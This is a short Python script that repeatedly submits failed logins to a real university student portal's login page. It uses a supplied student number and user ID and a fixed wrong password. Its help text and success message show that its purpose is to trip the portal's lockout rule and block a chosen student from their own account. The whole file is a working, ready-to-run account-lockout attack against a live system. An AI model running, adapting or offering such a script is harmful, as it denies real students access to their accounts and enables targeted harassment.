import requests
import re
import sys

url = "https://webmla2.tip.edu.ph/portal/student/new/public/login.php"

try:
	if(sys.argv[1] == 'h' or sys.argv[1] == "help"):
		print("INSTRUCTIONS: ")
		print("> python run.py <Student Number> <Student UserID> <Number of requests>")
	elif(len(sys.argv[1]) > 1 or len(sys.argv[2]) > 1):
		student_number = sys.argv[1]
		student_userid = sys.argv[2]
		reqLen = int(sys.argv[3])

		for i in range(reqLen):
			datas = {"student_number": student_number, "student_userid": student_userid, "student_password":"e04f6feb447402d2e5465c7f12f9cac4", "sy1_sem":"654348714e317a4b4655464b434c4f573234465533513d3d","btnLogin":"Login","uc":"97d264d10a1a4ae3a88d11fc5f44a0c8"}

			response = requests.post(url, data=datas)

			print(f"Response status: {response.status_code}")
			if('You are not allowed to log until' in response.text):
				s = r'You are not allowed to log([^>]+>)'
				result = re.search(s, response.text)
				print("Success! the student is blocked from the aris portal" + result.group(1).rstrip("')</script>"))
	
# except Exception as e:
# 	print(e)
except ValueError:
	print("Invalid values")
except IndexError:
	print("Insufficient arguments")